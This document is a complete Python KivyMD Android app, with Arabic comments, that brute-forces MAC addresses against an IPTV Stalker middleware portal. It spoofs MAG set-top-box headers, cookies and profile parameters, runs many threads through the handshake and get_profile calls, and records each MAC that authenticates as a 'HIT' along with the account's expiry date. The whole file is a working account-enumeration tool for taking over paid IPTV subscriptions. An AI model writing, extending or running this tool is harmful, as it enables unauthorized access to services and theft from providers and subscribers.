"""
Professional Stalker Middleware MAC Scanner PRO (Flash Engine v5.5)
Fully Optimized for: KivyMD 1.2.0 + Kivy 2.3.x (Pydroid3 / Android)
Fixed: No File Storage needed. Hits are saved and rendered directly via shared memory.
"""

from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationItem
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.card import MDCard
from kivymd.uix.label import MDLabel
from kivymd.uix.button import MDRaisedButton, MDIconButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.scrollview import MDScrollView
from kivymd.uix.list import MDList, OneLineListItem
from kivymd.uix.toolbar import MDTopAppBar

from kivy.lang import Builder
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty, BooleanProperty, ListProperty
from kivy.metrics import dp
from kivy.utils import get_color_from_hex

import threading
import requests
import time
import datetime
import re
import random
from queue import Queue

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────
#  قائمة الذاكرة المشتركة لحفظ الـ HITS مؤقتاً أثناء تشغيل التطبيق
# ─────────────────────────────────────────────
SHARED_HITS_MEMORY = []

# ─────────────────────────────────────────────
#  KV Layout Design
# ─────────────────────────────────────────────
KV = """
#:import dp kivy.metrics.dp
#:import get_color_from_hex kivy.utils.get_color_from_hex

<StatCard>:
    size_hint_y: None
    height: dp(90)
    orientation: "vertical"
    padding: dp(10)
    radius: [14]
    elevation: 2
    md_bg_color: app.theme_cls.bg_dark

    MDLabel:
        text: root.value
        halign: "center"
        bold: True
        font_style: "H5"
        theme_text_color: "Custom"
        text_color: root.accent_color

    MDLabel:
        text: root.title
        halign: "center"
        font_style: "Caption"
        theme_text_color: "Secondary"


<LogLine>:
    size_hint_y: None
    height: self.minimum_height
    padding: [dp(4), dp(1)]

    MDLabel:
        text: root.text
        markup: True
        font_style: "Body2"
        size_hint_y: None
        height: self.texture_size[1]
        theme_text_color: "Custom"
        text_color: root.line_color


<DashboardScreen>:
    name: "dashboard"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "IPTV MAC Scanner PRO v5.5"
            md_bg_color: app.theme_cls.primary_color

        MDScrollView:
            do_scroll_x: False

            MDBoxLayout:
                orientation: "vertical"
                spacing: dp(12)
                padding: dp(12)
                size_hint_y: None
                height: self.minimum_height

                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(90)

                    StatCard:
                        title: "TOTAL"
                        value: root.total_requests
                        accent_color: app.theme_cls.primary_light

                    StatCard:
                        title: "HITS"
                        value: root.success_hits
                        accent_color: get_color_from_hex("#00E676")

                    StatCard:
                        title: "ERRORS"
                        value: root.errors
                        accent_color: get_color_from_hex("#FF5252")

                MDCard:
                    orientation: "vertical"
                    padding: dp(14)
                    spacing: dp(14)
                    size_hint_y: None
                    height: self.minimum_height
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: "RANDOM STALKER PROTOCOL SETUP"
                        bold: True
                        size_hint_y: None
                        height: dp(25)

                    MDTextField:
                        id: target_url
                        hint_text: "Portal URL"
                        text: "http://fortv.cc:8080/"
                        mode: "rectangle"

                    MDTextField:
                        id: mac_prefix
                        hint_text: "MAC Prefix"
                        text: "00:1A:79"
                        mode: "rectangle"

                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height

                        MDTextField:
                            id: hex_start
                            hint_text: "Hex Start (Locked to Full)"
                            text: "000000"
                            mode: "rectangle"
                            disabled: True

                        MDTextField:
                            id: hex_end
                            hint_text: "Hex End (Locked to Full)"
                            text: "FFFFFF"
                            mode: "rectangle"
                            disabled: True

                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height

                        MDTextField:
                            id: threads
                            hint_text: "THREADS"
                            text: "30"
                            mode: "rectangle"
                            input_filter: "int"

                        MDTextField:
                            id: timeout
                            hint_text: "TIMEOUT"
                            text: "4.0"
                            mode: "rectangle"
                            input_filter: "float"

                MDCard:
                    orientation: "vertical"
                    padding: dp(12)
                    spacing: dp(8)
                    size_hint_y: None
                    height: dp(95)
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: root.status
                        bold: True
                        font_style: "Body1"

                    MDProgressBar:
                        id: progress_bar
                        value: root.progress
                        color: app.theme_cls.primary_color

                    MDLabel:
                        text: root.progress_text
                        halign: "right"
                        font_style: "Caption"

                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(52)

                    MDRaisedButton:
                        id: btn_start
                        text: "START ENGINE"
                        md_bg_color: get_color_from_hex("#00897B")
                        on_release: root.start_scan()

                    MDRaisedButton:
                        id: btn_stop
                        text: "STOP ENGINE"
                        md_bg_color: get_color_from_hex("#B71C1C")
                        on_release: root.on_stop_pressed()
                        disabled: True

                    MDRaisedButton:
                        text: "CLEAR LOGS"
                        md_bg_color: get_color_from_hex("#5D6266")
                        on_release: root.clear_logs()

                MDCard:
                    orientation: "vertical"
                    radius: [14]
                    padding: dp(8)
                    md_bg_color: get_color_from_hex("#0D1117")
                    size_hint_y: None
                    height: dp(220)

                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(26)

                        MDLabel:
                            text: "STALKER LIVE CONSOLE LOG"
                            bold: True
                            theme_text_color: "Custom"
                            text_color: get_color_from_hex("#8B949E")

                    MDScrollView:
                        id: log_scroll
                        do_scroll_x: False
                        MDBoxLayout:
                            id: log_container
                            orientation: "vertical"
                            size_hint_y: None
                            height: self.minimum_height
                            spacing: dp(1)


<SettingsScreen>:
    name: "settings"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "Captured Active HITS (RAM History)"
            md_bg_color: app.theme_cls.primary_color
            right_action_items: [["refresh", lambda x: root.load_hits_history()], ["delete-sweep", lambda x: root.clear_hits_memory()]]

        MDScrollView:
            do_scroll_x: False
            MDList:
                id: hits_list_container
                padding: dp(10)
                spacing: dp(5)
"""

# ─────────────────────────────────────────────
#  Widget Helper Classes
# ─────────────────────────────────────────────
class StatCard(MDCard):
    title = StringProperty("")
    value = StringProperty("0")
    accent_color = ListProperty([1, 1, 1, 1])

class LogLine(MDBoxLayout):
    text = StringProperty("")
    line_color = ListProperty([0.8, 0.8, 0.8, 1])

# ─────────────────────────────────────────────
#  Main Dashboard Screen Logic
# ─────────────────────────────────────────────
class DashboardScreen(MDScreen):
    total_requests = StringProperty("0")
    success_hits = StringProperty("0")
    errors = StringProperty("0")
    progress = NumericProperty(0)
    progress_text = StringProperty("0 / 0 (0%)")
    status = StringProperty("* STATUS: READY")
    running = BooleanProperty(False)

    MAX_LOG_ITEMS = 20

    def start_scan(self):
        if self.running:
            return

        base_url = self.ids.target_url.text.strip()
        if not base_url:
            self.status = "[!] STATUS: URL IS REQUIRED"
            return

        self._batch_size = 16777216
        
        self.m = 16777216
        self.a = 5
        self.c = 12345
        self.current_state = random.randint(0, self.m - 1)

        self.running = True
        self.status = "[>] STATUS: ENGINE RUNNING (RAM MODE)"
        self.ids.btn_start.disabled = True
        self.ids.btn_stop.disabled = False
        self.ids.log_container.clear_widgets()

        self.total = 0
        self.hits = 0
        self.errors_count = 0

        self.thread_count = int(self.ids.threads.text or 30)
        self.timeout_val = float(self.ids.timeout.text or 4.0)

        self.ui_queue = Queue()
        Clock.schedule_interval(self.consume_ui_queue, 0.4)

        self.add_log_to_ui("Core", "Pure Random RAM Engine Initialized Safely.", "info")
        threading.Thread(target=self.run_scanner_engine, args=(base_url,), daemon=True).start()

    def on_stop_pressed(self):
        self.running = False
        self.status = "[-] STATUS: STOPPED"
        self.ids.btn_start.disabled = False
        self.ids.btn_stop.disabled = True
        Clock.unschedule(self.consume_ui_queue)
        self.add_log_to_ui("Core", "Engine Suspended by User Request.", "warn")

    def run_scanner_engine(self, base_url):
        portal = f"{base_url if base_url.endswith('/') else base_url + '/'}portal.php"
        
        from urllib.parse import urlparse
        parsed_url = urlparse(base_url)
        host_header = parsed_url.netloc

        headers = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'X-User-Agent': 'Model: MAG270; Link: WiFi',
            'Host': host_header,
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }

        session = requests.Session()

        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            while self.running and self.total < self._batch_size:
                self.current_state = (self.a * self.current_state + self.c) % self.m
                mac = self.build_mac(self.current_state)
                
                executor.submit(self.check_single_mag_flow, session, portal, mac, headers)
                time.sleep(0.01)

    def check_single_mag_flow(self, session, portal, mac, headers):
        if not self.running:
            return
        
        cookies = {
            'mac': mac,
            'mac_w': mac,
            'timezone': 'Africa/Tunis',
            'adid': '5679d1a8d478c7d0c362e35c51c194bf',
            'stb_lang': 'en'
        }
        
        try:
            handshake_url = f"{portal}?type=stb&action=handshake&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a"
            res1 = session.get(handshake_url, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
            
            response_text = res1.text.lower()
            
            if '"token":' in response_text or '"js":' in response_text:
                timestamp = str(int(time.time()))
                profile_params = {
                    'type': 'stb',
                    'action': 'get_profile',
                    'hd': '1',
                    'ver': 'ImageDescription: 0.2.18-r23-250; ImageDate: Thu Sep 13 11:31:16 EEST 2018; PORTAL version: 5.3.0; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c',
                    'num_banks': '2',
                    'sn': '0000000000000',
                    'stb_type': 'MAG250',
                    'client_type': 'STB',
                    'image_version': '218',
                    'video_out': 'hdmi',
                    'device_id': '',
                    'device_id2': '',
                    'signature': '',
                    'auth_second_step': '1',
                    'hw_version': '1.7-BD-00',
                    'not_valid_token': '0',
                    'metrics': '',
                    'hw_version_2': '631be47f51991ebd34b22b70bdba6cf9bc904580',
                    'timestamp': timestamp,
                    'api_signature': '262',
                    'prehash': '',
                    'JsHttpRequest': '1-xml'
                }
                
                res2 = session.get(portal, params=profile_params, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
                
                if res2.status_code == 200 and ("parent_password" in res2.text.lower() or "expiry" in res2.text.lower()):
                    channels_url = f"{portal}?type=itv&action=get_all_channels"
                    res3 = session.get(channels_url, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
                    
                    expiry = "Active Account"
                    match = re.search(r'"expiry"\s*:\s*"([^"]+)"', res2.text, re.IGNORECASE)
                    if match:
                        expiry = match.group(1)
                        
                    if "data" in res3.text.lower() or res3.status_code == 200:
                        self.ui_queue.put(("DATA", (mac, "HIT", f"Valid IPTV | Exp: {expiry}")))
                    else:
                        self.ui_queue.put(("DATA", (mac, "HIT", f"Authenticated (Empty Core) | Exp: {expiry}")))
                else:
                    self.ui_queue.put(("DATA", (mac, "MISS", "")))
            else:
                self.ui_queue.put(("DATA", (mac, "MISS", "")))
                
        except:
            self.ui_queue.put(("DATA", (mac, "ERROR", "")))

    def consume_ui_queue(self, dt):
        if not self.running:
            return
            
        has_updates = False
        while not self.ui_queue.empty():
            q_type, q_data = self.ui_queue.get()
            
            if q_type == "DATA":
                mac, level, extra = q_data
                self.total += 1
                
                if level == "HIT":
                    self.hits += 1
                    self.add_log_to_ui("HIT", f"{mac} -> {extra}", "success")
                    
                    # حفظ مباشر داخل المصفوفة البرمجية المشتركة في الذاكرة (بدون إنشاء ملفات)
                    formatted_hit = f"HIT: {mac} | {extra} | {datetime.datetime.now().strftime('%H:%M:%S')}"
                    SHARED_HITS_MEMORY.append(formatted_hit)
                    
                elif level == "ERROR":
                    self.errors_count += 1
                    if self.total % 10 == 0: 
                        self.add_log_to_ui("ERR", "Gateway Timeout / Socket Refused", "error")
                else:
                    if self.total % 25 == 0:
                        self.add_log_to_ui("RAND", mac, "dim")
                    
                has_updates = True

        if has_updates:
            self.total_requests = str(self.total)
            self.success_hits = str(self.hits)
            self.errors = str(self.errors_count)
            
            pct = min(int((self.total / self._batch_size) * 100), 100)
            self.progress = pct
            self.progress_text = f"{self.total} / {self._batch_size}"
            
            if self.total >= self._batch_size:
                self.on_stop_pressed()

    def build_mac(self, value):
        suffix = f"{value:06X}"
        prefix = self.ids.mac_prefix.text.strip()
        return ":".join([prefix] + [suffix[i:i+2] for i in range(0, 6, 2)])

    COLOR_MAP = {
        "success": get_color_from_hex("#00E676"),
        "error":   get_color_from_hex("#FF5252"),
        "warn":    get_color_from_hex("#FFD740"),
        "info":    get_color_from_hex("#82AAFF"),
        "dim":     get_color_from_hex("#4F5661"),
    }

    def add_log_to_ui(self, tag, message, level="info"):
        color = self.COLOR_MAP.get(level, self.COLOR_MAP["info"])
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        
        line = LogLine()
        line.text = f"[color=#4F5661]{ts}[/color]  [{tag}] | {message}"
        line.line_color = color
        
        self.ids.log_container.add_widget(line)
        
        if len(self.ids.log_container.children) > self.MAX_LOG_ITEMS:
            self.ids.log_container.remove_widget(self.ids.log_container.children[-1])
            
        Clock.schedule_once(lambda dt: setattr(self.ids.log_scroll, "scroll_y", 0), 0.01)

    def clear_logs(self):
        self.ids.log_container.clear_widgets()


# ─────────────────────────────────────────────
#  Settings / History Screen Logic (RAM Rendering)
# ─────────────────────────────────────────────
class SettingsScreen(MDScreen):
    def on_enter(self):
        self.load_hits_history()

    def load_hits_history(self):
        container = self.ids.hits_list_container
        container.clear_widgets()

        # قراءة مباشرة من مصفوفة الذاكرة دون استدعاء نظام الملفات نهائياً
        if not SHARED_HITS_MEMORY:
            container.add_widget(OneLineListItem(text="No HITS captured yet."))
            return

        # عرض الـ HITS من الأحدث إلى الأقدم لقراءة سهلة ومريحة
        for hit in reversed(SHARED_HITS_MEMORY):
            item = OneLineListItem(text=hit)
            container.add_widget(item)

    def clear_hits_memory(self):
        # مسح القائمة من الذاكرة المؤقتة بالكامل
        SHARED_HITS_MEMORY.clear()
        self.load_hits_history()


class MainApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "Teal"
        self.theme_cls.theme_style = "Dark"

        Builder.load_string(KV)

        nav = MDBottomNavigation()
        dash = DashboardScreen()
        settings = SettingsScreen()

        tab1 = MDBottomNavigationItem(name="scanner", text="Scanner", icon="radar")
        tab1.add_widget(dash)
        tab2 = MDBottomNavigationItem(name="history", text="History", icon="history")
        tab2.add_widget(settings)

        nav.add_widget(tab1)
        nav.add_widget(tab2)
        return nav

if __name__ == "__main__":
    MainApp().run()
